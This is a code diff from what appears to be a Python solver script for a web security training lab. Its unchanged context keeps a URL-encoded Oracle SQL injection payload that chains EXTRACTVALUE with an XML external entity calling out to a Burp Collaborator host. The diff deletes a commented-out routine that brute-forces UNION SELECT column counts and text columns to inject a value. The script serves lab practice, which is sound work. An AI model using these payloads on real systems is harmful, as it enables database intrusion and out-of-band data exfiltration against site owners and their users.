@@ -56,48 +56,7 @@ def main(args):
 UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>
 <!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')
 +FROM+dual--
-"""        
-        
-        
-        
-        
-   # hint = shop.get_hint()
-   # print(hint)
-   # nulls_list = ["NULL"]
-   # num_columns = None
-   # log.info("Determining number of culmn")
-   # while len(nulls_list) < 50:
-   #     nulls = ",".join(nulls_list)
-   #     category = f"' UNION SELECT {nulls}-- "
-   #     resp = shop.get_category(category)
-   #     if resp.status_code == 200:
-   #         num_columns = len(nulls_list)
-   #         break
-   #     nulls_list.append("NULL")
-   # if num_columns:        
-   #     log.info(f"Number of columns is : {num_columns}")
-   # text_columns = []
-   # for i in range (0, num_columns):
-   #     nulls_list = ["NULL"] * num_columns    
-   #     nulls_list[i] = "'a'"
-   #     nulls = ",".join(nulls_list)
-   #     category = f"' UNION SELECT {nulls}-- "
-   #     resp = shop.get_category(category)
-   #     if resp.status_code == 200:
-   #         text_columns.append(i)
-   # text_columns_str = ", ".join(map(str, text_columns))            
-   # log.info(f"The text columns are: {text_columns_str}")
-   # 
-   # nulls_list = ["NULL"] * num_columns
-   # nulls_list[text_columns[0]] = f"'{hint}'"
-   # nulls = ",".join(nulls_list)
-   #      
-   # category = f"' UNION SELECT {nulls}-- "
-   # resp = shop.get_category(category)
-   # if resp.status_code == 200:    
-   #     shop.is_solved()
-    
-    
+"""       
 if __name__ == "__main__":
     args=utils.parse_args(sys.argv)
     main(args)
